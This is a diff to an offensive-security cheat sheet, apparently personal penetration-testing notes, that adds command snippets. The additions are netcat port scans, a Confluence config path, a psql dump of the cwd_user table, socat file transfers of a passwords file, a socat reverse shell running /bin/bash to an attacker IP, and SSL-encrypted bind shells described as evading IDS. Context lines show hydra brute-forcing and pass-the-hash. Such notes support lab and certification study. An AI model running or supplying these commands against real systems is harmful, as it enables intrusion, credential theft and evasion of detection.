@@ -3,6 +3,11 @@
 
 File extensions to search for:   `*.txt, *.pdf, *.ini, *.doc, *.docx, *.xls, *.xlsx`
 
+##### nc port scan
+```bash
+nc -zv 10.4.153.63 1-1024 2>&1 | grep succeeded
+```
+
 ##### Reboot system
 ```powershell
 shutdown /r /t 0
@@ -231,6 +236,13 @@ Start-Process powershell.exe -Verb runAs
 ```powershell
 powershell -ep bypass
 ```
+
+
+##### Default config files
+
+Confluence (on linux) - `/var/atlassian/application-data/confluence/confluence.cfg.xml`
+
+
 
 # OSINT
 
@@ -835,6 +847,11 @@ sudo sed -i -e 's/old_UUID/new_UUID/g' /etc/passwd
 
 ## Linux
 
+##### Port scanning newly discovered endpoints w/o nmap
+```bash
+nc -zv 10.4.247.63 1-1024 2>&1 | grep succeeded
+```
+
 ##### Find existing binaries w/ SUID or GUID perms on them:  
 ```bash
 find / -perm -u=s -type f 2>/dev/null
@@ -1026,6 +1043,30 @@ curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/
 
 ## SQLi
 
+### psql
+##### Show list of databases
+```postgresql
+\l
+```
+
+##### Use a specific database
+```postgresql
+\c <db name>
+```
+
+##### Show tables of a specific database
+```postgresql
+-- AFter using \c <db name> to enter into a database
+\dt
+```
+
+##### Dump table
+```postgresql
+SELECT * FROM cwd_user;
+```
+
+
+### MySQL
 ##### MySQL login
 ```bash
 # for Linux/ Mac(?)-based MySQL servers
@@ -1087,6 +1128,7 @@ select * from <db>.dbo.<table_name>;
 SELECT table_schema as database_name, table_name FROM information_schema.tables WHERE table_type = 'BASE TABLE' AND table_schema not in ('information_schema','mysql','performance_schema','sys') ORDER BY database_name, table_name;
 ```
 
+### In URL or vuln field
 ##### Test Auth Bypass
 ```sql
 -- In form field
@@ -1168,6 +1210,9 @@ https://canarytokens.com
 
 # Password Attacks
 
+\*\*\*NOTE:   If `INFO: Removed 3 hashes found as potfile entries.` is displayed in your hashcat output, it is because you've already cracked the hash.
+- You can find it located in the **hashcat.potfile** `find / -name hashcat.potfile 2>/dev/null`
+
 ##### Attack SSH using rockyou.txt
 ```bash
 hydra -l <user> -P /usr/share/wordlists/rockyou.txt -s <port> ssh://<IP>
@@ -1183,3 +1228,63 @@ hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://
 ```bash
 smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
 ```
+
+
+# Port Forwarding & SSH Tunneling
+
+## socat
+
+##### File transfers from:  
+```bash
+sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
+```
+	Very important! no space after comma  
+	◇ **TCP4-LISTEN** - Creates IPv4 listener : port  
+	◇ **fork** - Creates a child process once connection is made to the listener allowing for multiple connections  
+	◇ **file:** - Specifies name of file to be transferred  
+  
+##### File transfers to:  
+```bash
+socat TCP4:ip_address:443 file:received_secret_passwords.txt,create
+```
+	Very important! no space after comma  
+	◇ **TCP4** - Specifies IPv4 : ip address : port  
+	◇ **file** - Specifies local file name to save the file to  
+	◇ **create** - Specifies that a new file will be created  
+  
+##### Reverse shell Listener/ Attacker:  
+```bash
+socat -d -d TCP4-LISTEN:443 STDOUT
+```
+	**-d -d** for extra verbosity  
+
+##### Reverse shell Victim:  
+```bash
+socat TCP4:10.11.0.22:443 EXEC:/bin/bash
+```
+
+##### Encrypted Bind Shells: 
+```bash
+openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt  
+cat bind_shell.key bind_shell.crt > bind_shell.pem
+```
+◇ Use [openssl](openssl.md) to create an SSL cert to help evade IDSs.  
+◇ Convert the key and cert into a format that **socat** will accept: _.pem_  
+  
+##### Encrypted Bind Shell Listener/ Victim:  
+```bash
+sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
+``` 
+	◇ **OPENSSL-LISTEN** - Creates SSL listener : port  
+	◇ **cert =** - Specifies cert file  
+	◇ **verify** - Disables SSL verification  
+	◇ **fork** - Spawn a childproc once connection is made  
+  
+##### Encrypted Bind Shell Attacker:  
+```bash
+socat - OPENSSL:10.11.0.4:443,verify=0
+```
+	◇ **-** - Specifies transfer of data from STDIO to remote host  
+	◇ **OPENSSL:** - Establishes remote connection to SSL listener : ip address : port  
+	◇ **verify=0** - Disables SSL cert verification
+
